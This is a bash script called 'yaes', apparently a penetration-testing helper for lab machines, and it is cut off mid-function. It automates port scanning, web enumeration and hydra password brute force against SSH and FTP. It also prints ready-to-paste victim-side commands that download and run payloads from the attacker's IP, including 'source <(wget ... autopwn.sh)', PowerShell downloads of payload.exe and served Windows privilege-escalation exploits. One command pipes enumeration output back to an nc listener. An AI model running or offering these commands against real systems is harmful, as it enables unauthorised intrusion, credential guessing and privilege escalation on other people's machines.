#!/bin/bash

# ideas:
# davtest - davtest -url http://granny/ if found webdav


# yaes - yet another enumeration script
# v0.0.1
# author: d47zm3

config_path=~/.yaes.conf

# follow log filename pattern: ${target}.${protocol}.${port}.${tool}
logs_path="${HOME}/.yaes/logs/"

arg_number=${#}
mode=${1}
option_2=${2}
option_3=${3}

status_file="${logs_path}/${target}/.status"

red='\033[0;31m'
green='\033[0;32m'
no_color='\033[0m'

web_services=0
samba_services=0
ftp_services=0
ssh_services=0
dns_services=0
wp_found=0

tcp_deep_scan=0
udp_deep_scan=0

no_udp=0
no_tcp=0

long_jobs_pids=( )

function check_status
{
  if [[ ! -e ${status_file} ]]
  then
    echo 0 > ${status_file}
    return 0
  fi

  if [[ -e ${status_file} ]]
  then
    grep -q 0 ${status_file}
    if [[ ${?} -eq 0 ]]
    then
      return 0
    else
      return 1
    fi 
  fi
}

function decho
{
  string=${1}
  echo -e "[$( date +'%H:%M:%S' )] ${string}"
}

function decho_red
{
  string=${1}
  echo -e  "${red}[$( date +'%H:%M:%S' )] ${string}${no_color}"
}

function decho_green
{
  string=${1}
  echo -e "${green}[$( date +'%H:%M:%S' )] ${string}${no_color}"
}

function echo_green
{
  string=${1}
  echo -e "${green}${string}${no_color}"
}

function cheatsheet
{
  if [[ -z ${target} ]]
  then
    target="10.10.10.1"
  fi

  echo_green "discover hosts in range"
  echo "netdiscover -i \$interface -r ${target}/24"
  echo ""

  echo_green "quick scan using unicornscan - might not work on some vpns, after color - ports to scan, a for all ports, m for mode, tcp default, U for udp"
  echo "unicornscan ${target}:1-4000 ${target}:a -m [tcp,U]"
  echo ""

  echo_green "quick scan using unicornscan - might not work on some vpns, after color - ports to scan, a for all ports, m for mode, tcp default, U for udp"
  echo "unicornscan ${target}:1-4000 ${target}:a -m [tcp,U]"
  echo ""

  echo_green "download file using powershell (3.0)+"
  echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://10.10.15.207:8888/payload.exe' -OutFile 'payload.exe'}\""
  echo ""

  echo_green "download file using powershell (2.0)"
  echo "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://10.10.16.10:80/vdmallowed.exe', 'vdmallowed.exe')\""
  echo ""

}

function serve_ftp
{
  file=${1}
  if [[ -z ${file} ]]
  then
    file="<your filename here>"
  fi
  decho_green "setting up ftp server for files in $( pwd ) directory..."
  local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
  decho "paste commands below to windows host..."
  echo "echo open ${local_ip} 21 > ftp.txt"
  echo "echo user anonymous >> ftp.txt"
  echo "echo password >> ftp.txt"
  echo "echo bin >> ftp.txt"
  echo "echo mget ${filename} >> ftp.txt"
  echo "echo bye >> ftp.txt"
  echo "ftp -i -n -s:ftp.txt"
  echo ""
  decho_green "press ctrl+c to stop ftp server..."
  twistd -n ftp -p 21 -r . > /dev/null
  
}


function serve_samba
{
  decho_green "setting up samba share for files in $( pwd ) directory..."
  file=${1}
  if [[ -z ${file} ]]
  then
    file="<your filename here>"
  fi
  local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
  decho "paste commands below on windows host to access file over samba..."
  echo "\\${local_ip}\MS10-059.exe"
  echo ""
  decho_green "press ctrl+c to stop ftp server..."
  impacket-smbserver hacker $( pwd ) > /dev/null
}

function sherlock
{

    source ${config_path}
    current_dir=$( pwd )
    local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
    target=${option_2}
    if [[ -z "${target}" ]]
    then
      decho_red "missing workspace directory (where systeminfo will be dumped)"
      exit 1
    fi

    # serve static netcat.exe
    cd ${repository_root}/

    python -m SimpleHTTPServer ${web_port} >/dev/null 2>&1 &

    cd workspace
    cd ${target}
    nc -lnp 9876 > sherlock.log &

    sleep 2
    decho_green "download netcat to host, set up local netcat listener to accept input from sherlock!"
    decho "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/static-binaries/windows/x86/nc.exe' -OutFile 'nc.exe'}\""
    decho "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/privilege-escalation/scripts/sherlock.ps1' -OutFile 'sherlock.ps1'}\""
    decho "OR"
    decho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/static-binaries/windows/x86/nc.exe', 'nc.exe')\""
    decho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/privilege-escalation/scripts/sherlock.ps1', 'sherlock.ps1')\""
    decho_green "time to run sherlock and get output!"
    decho "powershell -ExecutionPolicy Bypass -Command \"Import-Module .\sherlock.ps1 ; Find-AllVulns\" | nc ${local_ip} 9876"

    decho "closing in 90 seconds..."
    sleep 90
    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
    ps aux | grep "nc -lnvp 9876" | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
    decho "done serving, here's result!"

    cat ${target}/sherlock.log
    cd ${current_dir}
    exit 0
}

function check_type
{
  path=${1}
  file_output=$( file ${path} )
  if [[ ${file_output} = *"Bourne"* ]]
  then
    echo "bash"
  elif [[ ${file_output} = *"Perl"* ]]
  then
    echo "perl"
  elif [[ ${file_output} = *"C source"* ]]
  then
    echo "c"
  elif [[ ${file_output} = *"Python"* ]]
  then
    echo "python"
  elif [[ ${file_output} = *"ELF"* ]]
  then
    echo "elf"
  elif [[ ${file_output} = *"PE32"* ]]
  then
    echo "windows"
  else
    echo "other"
  fi
}
function print_download_links
{
    local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
    client=${1}
    decho_green "most useful payloads..."
    decho_green "run command below on victim for auto-enumerate, auto-exploit suggest and send output to attacker..."
    echo "cd /dev/shm && source <(${client} -s http://${local_ip}:${web_port}/autopwn.sh)"
    categories=( "enumeration" "privilege-escalation" "exploits" "common" "static-binaries")
    for category in ${categories[@]}
    do
      decho_red "category: ${category}"
      for filename in $( find -L ${category}/ -type f )
      do
        type=$( check_type ${repository_root}/common/${filename} )
        file=$( basename ${filename} )
        if [[ ${type} == "bash" ]] || [[ ${type} == "elf" ]]
        then
          echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && chmod +x ${file} && ./${file}"
        elif [[ ${type} == "python" ]]
        then
          echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && python ${file}"
        elif [[ ${type} == "perl" ]]
        then
          echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && perl ${file}"
        elif [[ ${type} == "c" ]]
        then
          echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && gcc ${file} -o ${file}.out && chmod +x ${file}.out && ./${file}.out"
        elif [[ ${type} == "windows" ]]
        then
          echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/${filename#./}' -OutFile '${file}'}\""
          echo "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/${filename#./}', '${file}')\""
        fi
      done
    done
    
    return 
}

function help
{
  if [ "${arg_number}" -eq 0 ]
  then
    decho "usage: ${0} [--help/-h] <hostname/ip>"
    decho "or... --enumerate - this will run standalone enumeration on linux box and print output"
    decho "or... --cheatsheet [target] - this will print cheatsheet with common tools/examples, add hostname to input target address/hostname"
    decho "or... --web-proxy <target> <port> - this will run socat and let you access website over your hacking box port ${proxy_port}"
    decho "or... --quick-serve - runs local http server on ${web_port}, prints links to download files in current directory with powershell"
    decho "or... --http-server [download client] - runs simple http server, shows ready to copy & paste commands to run all kinds of scripts, enumeration, post-exploitation etc. using chosen client on target (wget by default)"
    decho "or... --ftp-server <filename> - runs ftp server in current directory, prints commands to download file to windows host using it"
    decho "or... --samba-server <filename> - runs samba server in current directory, prints commands to access file on windows host using it"
    decho "or... --windows-exploit-suggest <target workspace directory> - runs simple http server, serves nc.exe to automate pass of systeminfo to local windows-exploit-suggester, runs it, makes suggestion on reliable exploits"
    decho "or... --sherlock <target workspace directory> - runs simple http server, serves nc.exe to automate pass of Sherlock.ps1 script output"
    decho "missing parameters, hostname or filename with hostnames required" 
    exit 1
  fi

 if [[ "${mode}" == "--help"  ]] || [[ "${mode}" == "-h" ]]
  then
    decho "usage: ${0} [--help/-h] <hostname/ip>"
    decho "or... --enumerate - this will run standalone enumeration on linux box and print output"
    decho "or... --cheatsheet [target] - this will print cheatsheet with common tools/examples, add hostname to input target address/hostname"
    decho "or... --web-proxy <target> <port> - this will run socat and let you access website over your hacking box port ${proxy_port}"
    decho "or... --quick-serve - runs local http server on ${web_port}, prints links to download files in current directory with powershell"
    decho "or... --http-server <download client> - runs simple http server, shows ready to copy & paste commands to run all kinds of scripts, enumeration, post-exploitation etc. using chosen client on target (wget by default)"
    decho "or... --ftp-server <filename> - runs ftp server in current directory, prints commands to download file to windows host using it"
    decho "or... --samba-server <filename> - runs samba server in current directory, prints commands to access file on windows host using it"
    decho "or... --windows-exploit-suggest <target workspace directory> - runs simple http server, serves nc.exe to automate pass of systeminfo to local windows-exploit-suggester, runs it, makes suggestion on reliable exploits"
    decho "or... --sherlock <target workspace directory> - runs simple http server, serves nc.exe to automate pass of Sherlock.ps1 script output"
    exit 0
  fi

  if [[ "${mode}" == "--cheatsheet"  ]]
  then
    cheatsheet
    exit 0
  fi

  if [[ "${mode}" == "--windows-exploit-suggest" ]]
  then

    source ${config_path}
    current_dir=$( pwd )
    local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
    target=${option_2}
    if [[ -z "${target}" ]]
    then
      decho_red "missing workspace directory (where systeminfo will be dumped)"
      exit 1
    fi

    # serve static netcat.exe
    cd ${repository_root}/static-binaries/windows/x86

    python -m SimpleHTTPServer ${web_port} >/dev/null 2>&1 &

    cd ${target}
    nc -lnp 9876 > systeminfo.log &

    sleep 2
    decho_green "download netcat to host, set up local netcat listener to accept input from systeminfo, feed it to windows-exploit-suggester!"
    decho "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/nc.exe' -OutFile 'nc.exe'}\""
    decho "OR"
    decho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/nc.exe', 'nc.exe')\""
    decho "systeminfo | nc ${local_ip} 9876"
    decho "closing in 90 seconds..."
    sleep 30
    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
    ps aux | grep "nc -lnvp 9876" | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
    sleep 3
    decho "check if web died"
    ps aux | grep SimpleHTTPServer 

    decho "done serving, analyze result..."
    # choose newest database
    database=$( ls -lt ${repository_root}/privilege-escalation/windows-exploit-suggester | grep xls | head -n1 | awk ' { print $NF } ' )
    ${repository_root}/privilege-escalation/windows-exploit-suggester/windows-exploit-suggester.py --database ${repository_root}/privilege-escalation/windows-exploit-suggester/${database} --systeminfo ${target}/systeminfo.log  > ${target}/privilege-escalation.log
    known_reliable_exploits=( "MS16-098" "MS10-059")
    for exploit in "${known_reliable_exploits[@]}"
    do
      decho "checking for exploit ${exploit}..."
      grep "${exploit}" ${target}/privilege-escalation.log
      if [[ ${?} -eq 0 ]]
      then
        decho_green "seems like found possible reliable exploit... serving exploit over http, download it and execute for victory!"
        cd ${repository_root}/exploits/windows
        python -m SimpleHTTPServer ${web_port} &
        sleep 2
        decho "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/${exploit}.exe' -OutFile '${exploit}.exe'\" && ${exploit}.exe"
        decho "OR"
        decho "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://${local_ip}:${web_port}/${exploit}.exe', '${exploit}.exe')\""
        decho "closing in 90 seconds..."
        sleep 30
        ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill -9  >/dev/null 2>&1
      fi
    done

    cd ${current_dir}
    exit 0
  fi

  if [[ "${mode}" == "--ftp-server"  ]]
  then
    source ${config_path}
    serve_ftp ${option_2}
    exit 0
  fi

  if [[ "${mode}" == "--samba-server"  ]]
  then
    source ${config_path}
    serve_samba ${option_2}
    exit 0
  fi

  if [[ "${mode}" == "--sherlock"  ]]
  then
    sherlock
    exit 0
  fi

  if [[ "${mode}" == "--web-proxy"  ]]
  then
    # load config for repository root
    source ${config_path}
    local_ip=$( ip -f inet -o addr show ${web_iface} | cut -d\  -f 7 | cut -d/ -f 1 )
    decho_green "serving on ${local_ip} on port ${proxy_port}, access via: http://${local_ip}:${proxy_port}/ - press ctrl+c to stop it"
    socat TCP-LISTEN:${proxy_port},fork TCP:${option_2}:${option_3}
    exit 0
  fi

  if [[ "${mode}" == "--quick-serve"  ]]
  then
    # load config for repository root
    source ${config_path}
    decho_green "opening portal..."
    local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
    current_dir=$( pwd )
    client=${option_2}
    if [[ -z ${client} ]]
    then
      client="wget"
    fi
    python -m SimpleHTTPServer ${web_port} &

    for filename in $( find -L . -type f )
    do
      type=$( check_type ${filename} )
      file=$( basename ${filename} )
      if [[ ${type} == "bash" ]] || [[ ${type} == "elf" ]]
      then
        echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && chmod +x ${file} && ./${file}"
      elif [[ ${type} == "python" ]]
      then
        echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && python ${file}"
      elif [[ ${type} == "perl" ]]
      then
        echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && perl ${file}"
      elif [[ ${type} == "c" ]]
      then
        echo "cd /dev/shm && ${client} http://${local_ip}:${web_port}/${filename#./} && gcc ${file} -o ${file}.out && chmod +x ${file}.out && ./${file}.out"
      elif [[ ${type} == "windows" ]]
      then
        echo "powershell.exe -Command \"& { Invoke-WebRequest 'http://${local_ip}:${web_port}/${filename#./}' -OutFile '${file}'}\""
      fi
    done

    sleep 2
    echo "closing in 60 seconds..."
    sleep 60
    cd ${current_dir}
    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
    exit 0
  fi

  if [[ "${mode}" == "--http-server"  ]]
  then
    # load config for repository root
    source ${config_path}
    decho_green "opening portal..."
    current_dir=$( pwd )
    client=${option_2}
    if [[ -z ${client} ]]
    then
      client="wget"
    fi
    cd ${repository_root}/common
    python -m SimpleHTTPServer ${web_port} &
    print_download_links ${client}
    sleep 2
    echo "closing in 60 seconds..."
    sleep 60
    cd ${current_dir}
    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
    exit 0
  fi

  target=${mode}
  mkdir ${target}
  exec > >(tee ${target}/yaes.log)
  decho_green "starting yaes..."
}

function check_dependencies
{
  decho "checking for required tools if they are present..."
  tools=( nmap nikto gobuster wpscan amap hydra searchsploit smbclient )
  for tool in ${tools[@]}
  do
    which ${tool} 1>/dev/null
    if [[ ${?} -eq 1 ]]
    then
      decho "${tool} not present, please install it or add to default path..."
      exit 1
    fi
  done
}


function load_config
{
  decho "loading config file from ${config_path}..."
  source ${config_path}
  decho "using interface ${iface}"
  logs_structure
}

function check_wp
{
  url=${1}
  decho "checking for presence of wordpress..."
  curl -s -I -k ${url}/wp-content/ | grep "HTTP\/" | grep -q "404"
  if [[ ${?} -eq 1 ]]
  then
    wp_found=1
  fi
  curl -s -I -k ${url}/wp-includes/ | grep "HTTP\/" | grep -q "404"
  if [[ ${?} -eq 1 ]]
  then
    wp_found=1
  fi
  curl -s -I -k ${url}/wp-admin/ | grep "HTTP\/" | grep -q "404"
  if [[ ${?} -eq 1 ]]
  then
    wp_found=1
  fi

  if [[ ${wp_found} -eq 1 ]]
  then
    decho_green "found possible wordpress instance, enumerating..."

    wpscan_logs="${logs_path}/${target}/wpscan"
    mkdir -p "${wpscan_logs}"

    wpscan --url ${url} --batch --no-banner --random-agent --enumerate u > ${wpscan_logs}/${target}.tcp.${port}.wpscan &
    long_jobs_pids+=(${!})
    decho "running wpscan on ${target}/${port} in background..."
  fi
}

function samba_scan
{
  target=${1}
  port=${2}
  samba_logs="${logs_path}/${target}/samba"
  mkdir -p "${samba_logs}"

  decho_green "found open samba port... enumerating..."
  samba_version=$( smbclient -NL ${target} -p ${port} | egrep -o "Samba [0-9.]*" | sort | uniq | head -n1) 
  if [[ ! -z "${samba_version// }" ]]
  then
    decho "enumerated samba version: ${samba_version}"
  fi
  smbclient -N -L ${target} -p ${port} | tee  ${samba_logs}/${target}.tcp.${port}.smbclient &
  decho_green "trying to list files from shares without logging..."
  for share in $( smbclient -NL ${target} -p ${port} | grep Disk | awk ' { print $1 } ' )
  do
    smbclient -N -p ${port} //${target}/${share} -c ls
  done
}

function web_scanners
{
  target=${1}
  port=${2}

  nikto_logs="${logs_path}/${target}/nikto"
  mkdir -p "${nikto_logs}"

  gobuster_logs="${logs_path}/${target}/gobuster"
  mkdir -p "${gobuster_logs}"

  whatweb_logs="${logs_path}/${target}/whatweb"
  mkdir -p "${whatweb_logs}"

  fimap_logs="${logs_path}/${target}/fimap"
  mkdir -p "${fimap_logs}"

  webdav_logs="${logs_path}/${target}/webdav"
  mkdir -p "${webdav_logs}"


  decho "checking available methods on ${target}/${port}..."
  nmap -p${port} --script=http-methods.nse ${target}

  if [[ ${port} -eq 443 ]]
  then
    
    decho "running whatweb on ${target}/${port}..."
    whatweb https://${target}:${port}/ | tee ${whatweb_logs}/${target}.tcp.${port}.whatweb

    decho "running fimap on ${target}/${port}..."
    fimap -D -H -4 -u "https://${target}:${port}/" | tee ${fimap_logs}/${target}.tcp.${port}.fimap

    decho "testing webdav..."
    davtest -url https://${target}/ | tee ${webdav_logs}/${target}.tcp.${port}.webdav

    nikto -port ${port} -host https://${target}/ &> ${nikto_logs}/${target}.tcp.${port}.nikto &
    long_jobs_pids+=(${!})
    decho "running nikto on ${target}/${port} in background..."

    gobuster -k -w ${gobuster_wordlist} -u https://${target}:${port}/ -r -t 200 &> ${gobuster_logs}/${target}.tcp.${port}.gobuster &
    long_jobs_pids+=(${!})
    decho "running gobuster on ${target}/${port} in background..."

    check_wp "https://${target}:${port}/"
  else
    decho "running whatweb on ${target}/${port}..."
    whatweb http://${target}:${port}/ | tee ${whatweb_logs}/${target}.tcp.${port}.whatweb

    decho "running fimap on ${target}/${port}..."
    fimap -D -H -4 -u "http://${target}:${port}/" | tee ${fimap_logs}/${target}.tcp.${port}.fimap

    decho "testing webdav..."
    davtest -url http://${target}/ | tee ${webdav_logs}/${target}.tcp.${port}.webdav

    nikto -port ${port} -host http://${target}/ &> ${nikto_logs}/${target}.tcp.${port}.nikto &
    long_jobs_pids+=(${!})
    decho "running nikto on ${target}/${port} in background..."

    gobuster -k -w ${gobuster_wordlist} -u http://${target}:${port}/ -r -t 200 &> ${gobuster_logs}/${target}.tcp.${port}.gobuster &
    long_jobs_pids+=(${!})
    decho "running gobuster on ${target}/${port} in background..."

    check_wp "http://${target}:${port}/"
  fi
}


function long_scans
{

  amap_logs="${logs_path}/${target}/amap"
  mkdir -p ${amap_logs}

  nmap_logs="${logs_path}/${target}/nmap"

  decho "starting long deep tcp scan in background..."
  nmap -T5 -p- -sV -sC -oX ${nmap_logs}/${target}.nmap.tcp.deep.output.xml -e${iface} ${target} &> ${nmap_logs}/${target}.nmap.tcp.deep.output.log &
  tcp_deep_scan=${!}

  decho "starting long deep udp scan in background..."
  nmap -T4 -sU -p- -sC -oX  ${nmap_logs}/${target}.nmap.udp.deep.output.xml -e ${iface} ${target} &> ${nmap_logs}/${target}.nmap.udp.deep.output.log &
  udp_deep_scan=${!}

  nmap -e ${iface} -A -sV -sC -oX ${nmap_logs}/${target}.tcp.detailed.xml -oG ${nmap_logs}/${target}.tcp.detailed.nmap.grep -p ${t_ports} ${target} &> ${nmap_logs}/${target}.nmap.tcp.detailed.output.log &

  if [[ ${no_tcp} -eq 0 ]]
  then
    open_ports=( $( cat "${nmap_logs}/${target}.tcp.nmap.quick.log" | grep -v "Not shown" | grep open | grep -o "^[0-9]*" ) )

    delim=$','
    printf -v var "%s$delim" "${open_ports[@]}"
    t_ports="${var%$delim}"

    decho "running detailed nmap scan on tcp ports ${t_ports} in background..."
    nmap -e ${iface} -A -sV -sC -oX ${nmap_logs}/${target}.tcp.detailed.xml -oG ${nmap_logs}/${target}.tcp.detailed.nmap.grep -p ${t_ports} ${target} &> ${nmap_logs}/${target}.nmap.tcp.detailed.output.log &
    long_jobs_pids+=(${!})

    for port in ${open_ports[@]}
    do

      decho "checking application mapping..."
      amap -A ${target} ${port} | grep Protocol | sed 's/Protocol/protocol/g' > ${amap_logs}/${target}.tcp.${port}.amap.log
      while read mapping
      do
       decho_green "${mapping}"
      done < ${amap_logs}/${target}.tcp.${port}.amap.log

      if egrep -q "ftp" ${amap_logs}/${target}.tcp.${port}.amap.log
      then
        decho "port ${port} seems like ftp service, starting ftp enumeration/bruteforce..."
        ftp_services=1
        decho_green "trying to download files as anonymous user from ftp server..."
        cd ${target}/files
        wget -rq ftp://${target}:${port} --ftp-user=username --ftp-password=password
        cd ../..
        brute_force ${target} ${port} ftp
      fi

      if egrep -q "ssh" ${amap_logs}/${target}.tcp.${port}.amap.log
      then
        decho "port ${port} seems like ssh service, starting ssh enumeration/bruteforce..."
        ssh_services=1
        brute_force ${target} ${port} ssh
      fi
      
      if egrep -q "http|http-apache|ssl" ${amap_logs}/${target}.tcp.${port}.amap.log
      then
        decho "port ${port} seems like web service, starting web scanners..."
        web_services=1
        web_scanners ${target} ${port}
      fi

      if egrep -q "netbios-session" ${amap_logs}/${target}.tcp.${port}.amap.log
      then
        decho "port ${port} seems like samba service, starting samba enumeration..."
        samba_services=1
        samba_scan ${target} ${port}
      fi

      if egrep -q "dns" ${amap_logs}/${target}.tcp.${port}.amap.log
      then
        decho "port ${port} seems like dns, starting dns enumeration..."
        dns_services=1
        dig @${target} ${target} any
        #fierce -dns cronos.htb
      fi


    done
  fi

  if [[ ${no_udp} -eq 0 ]]
  then
    open_ports=( $( cat "${nmap_logs}/${target}.udp.nmap.quick.log" | grep -v "Not shown" | grep open | grep -o "^[0-9]*" ) )

    delim=$','
    printf -v var "%s$delim" "${open_ports[@]}" 
    u_ports="${var%$delim}"

    decho "running detailed nmap scan on udp ports ${u_ports} in background..."
    nmap -e ${iface} -sU -A -sV -sC -oX ${nmap_logs}/${target}.udp.detailed.xml -oG ${nmap_logs}/${target}.udp.detailed.grep -p ${u_ports} ${target} &> ${nmap_logs}/${target}.nmap.udp.detailed.output.log &
    long_jobs_pids+=(${!})

    for port in ${open_ports[@]}
    do

      decho "checking application mapping..."
      amap -A ${target} ${port} | grep Protocol > ${amap_logs}/${target}.udp.${port}.amap.log
      while read mapping
      do
       decho_green "${mapping}"
      done < ${amap_logs}/${target}.udp.${port}.amap.log
      
    done
  fi

}

function initial_scan_nmap
{
  if check_status
  then
    decho_green "found state file, not running scan..."
    return 0
  fi
  nmap_logs="${logs_path}/${target}/nmap"
  mkdir -p "${nmap_logs}"

  decho "running quick tcp nmap scan for open ports..."
  nmap -T4 -F -e ${iface} ${target} &> ${nmap_logs}/${target}.tcp.nmap.quick.log
  decho "nmap quick scan results for tcp..."
  tcp_ports_count=$( cat ${nmap_logs}/${target}.tcp.nmap.quick.log | grep -v "Not shown" | grep open | wc -l )
  if [[ ${tcp_ports_count} -ne 0 ]]
  then
    cat ${nmap_logs}/${target}.tcp.nmap.quick.log | grep -v "Not shown" | grep open | awk -v date="$(date +"%H:%M:%S")" ' { print "\033[32m[" date "] found open port " $1 " for service " $3  "\033[0m" } '
  else
    decho_red "no open tcp ports found!"
    no_tcp=1
  fi

  decho "running quick udp nmap scan for open ports..."
  nmap -T4 -F -sU -e ${iface} ${target} &> ${nmap_logs}/${target}.udp.nmap.quick.log
  decho "nmap quick scan results for udp..."
  udp_ports_count=$( cat ${nmap_logs}/${target}.udp.nmap.quick.log | grep -v "Not shown" | grep open | wc -l )
  if [[ ${udp_ports_count} -ne 0 ]]
  then
    cat ${nmap_logs}/${target}.udp.nmap.quick.log | grep -v "Not shown" | grep -v "open\|filtered" |  grep open | awk -v date="$(date +"%H:%M:%S")" ' { print "\033[32m[" date "] found open port " $1 " for service " $3  "\033[0m" } '
  else
    decho_red "no open udp ports found!"
    no_udp=1
  fi

  decho "starting long scans in background..."
  long_scans
  
}

function logs_structure
{
  mkdir -p ${logs_path}
}

function web_results
{
  for file in ${nikto_logs}/*
  do
    address=$( cat ${file} | grep "Target IP" | awk ' { print $NF } ' )
    port=$( cat ${file} | grep "Target Port" | awk ' { print $NF } ' )
    decho_green "found web server ${address}/${port} info/issues..."
    cat ${file} | tail -n +6
  done

  gobuster_logs="${logs_path}/${target}/gobuster"
  gobuster_results=$( ls ${gobuster_logs}/ | wc -l )

  found_dirs=( )
  if [[ ${gobuster_results} -eq 2 ]]
  then
    decho "found two web services, checking if directories are the same..."
    for file in ${gobuster_logs}/*
    do
      dirs=$( cat ${file} | grep -i "status:" | sort )
      found_dirs+=( "${dirs}" )
    done

    if [[ ${found_dirs[0]} == ${found_dirs[1]} ]]
    then
      decho_green "directories are equal of both services..."
      cat ${gobuster_logs}/* | sort | uniq
    else
      decho_green "directories are different!"
      for file in ${gobuster_logs}/*
      do
        #address=$( cat ${file} | egrep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*:[0-9]*" )
        address=$( cat ${file} | egrep -o "http://.*" )
        decho "directories for ${address}..."
        cat ${file} | egrep -i "status:" | sort 
      done
    fi
  else
    for file in ${gobuster_logs}/*
      do
        address=$( cat ${file} | egrep -o "http://.*" )
        #address=$( cat ${file} | egrep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*:[0-9]*" )
        decho "directories for ${address}..."
        cat ${file} | egrep -i "status:" | sort 
      done
  fi

  if [[ ${wp_found} -eq 1 ]]
  then
    decho_green "wordpress instance enumeration..."
    cat ${wpscan_logs}/${target}.tcp.*.wpscan
  fi
}

function display_report
{
  echo 1 > ${status_file}
  decho_green "report for ${target}..."
  if [[ ${no_tcp} -eq 0 ]]
  then
    decho_green "found open ports/services for tcp..."
    cat ${nmap_logs}/${target}.nmap.tcp.detailed.output.log
    cat ${nmap_logs}/${target}.nmap.tcp.detailed.output.log | egrep -iq "445.*windows"
    if [[ ${?} -eq 0 ]]
    then
      decho_green "found possible windows host, checking for most common vulnerabilities..."
      windows_vulnerability ${target} 445
    fi
  fi

  if [[ ${no_udp} -eq 0 ]]
  then
    decho_green "found open ports/services for udp..."
    cat ${nmap_logs}/${target}.nmap.udp.detailed.output.log
  fi

  if [[ ${ftp_services} -eq 1 ]]
  then
    service="ftp"
    port=21
    decho_green "found ftp services, showing brute force attempt results..."
    cat ${hydra_logs}/${target}.tcp.${port}.${service}.hydra &
  fi

  if [[ ${ssh_services} -eq 1 ]]
  then
    service="ssh"
    port=22
    decho_green "found ssh services, showing brute force attempt results..."
    cat ${hydra_logs}/${target}.tcp.${port}.${service}.hydra &
  fi

  if [[ ${samba_services} -eq 1 ]]
  then
    if [[ ! -z ${samba_version// } ]]
    then
      decho "trying to match samba version with searchsploit..."
      searchsploit ${samba_version}
    fi
    decho_green "samba enumeration..."
    cat ${samba_logs}/${target}.tcp.*.smbclient
  fi

  if [[ ${web_services} -eq 1 ]]
  then
    web_results  
  fi

}

function loop_jobs
{

  if check_status
  then
    return 0
  fi

  finished=0
  progress=0

  decho "waiting for long scans to finish..."

  while [[ finished -eq 0 ]]
  do
    all_done=1
    for job in ${long_jobs_pids[@]}
    do
      if  ps -p ${job} > /dev/null 
      then
        #decho "job ${job} still running... $( ps -p ${job} --no-headers | awk ' { print $NF } ' )"
        all_done=0
      fi
    done

    progress=$((progress+1))

    if [[ ${all_done} -eq 1 ]]
    then
      finished=1
    fi

    #decho "current progres outside... ${progress}"

    if [[ ${progress} -eq 6 ]]
    then
      decho_red "scan still not finished, partial results, so you can start looking..."
      if [[ ${web_services} -eq 1 ]]
      then
        web_results  
      fi
      progress=0
    fi
    sleep 90
  done
}

function brute_force 
{
  target=${1}
  port=${2}
  service=${3}
  username=${4}

  hydra_logs="${logs_path}/${target}/hydra"
  mkdir -p ${hydra_logs}

  if [[ -z "${username// }" ]]
  then
    username=root
  fi

  if [[ ${service} == "ftp" ]]
  then
    decho_green "ftp banner grabbing for ${port}/${service}..."
    nmap -sS -sV -p ${port} -v -n -Pn --script banner ${target} | grep banner
    nmap -sS -sV -p 21 -v -n -Pn --script banner lame | grep banner | sed 's/|_banner://g' | egrep -qi "vsftpd"
    decho_green "trying to list ftp directories as anonymous user..."
    curl ftp://${target}:${port}/ --user ftp:ftp
    if [[ ${?} -eq 0 ]]
    then
      decho "found popular ftp server, looking for potential exploits..."
      nmap -sS -sV -p ${port} -v -n -Pn --script banner ${target} | grep banner | sed 's/|_banner://g' | egrep -o "[a-zA-Z]*[ \t]*[0-9]*\.*[0-9]*\.[0-9]" | xargs searchsploit
    fi
    decho_green "quick brute force on ${service} using ${username} as login..."
    hydra -t 50 -l ${username} -P ${hydra_quick_wordlist} -v ${target} ${service} &> ${hydra_logs}/${target}.tcp.${port}.${service}.hydra &
    long_jobs_pids+=(${!})
    decho "running quick hydra on ${target}/${port} (${service}) in background..."
  fi

  if [[ ${service} == "ssh" ]]
  then
    decho_green "ssh banner grabbing for ${port}/${service}..."
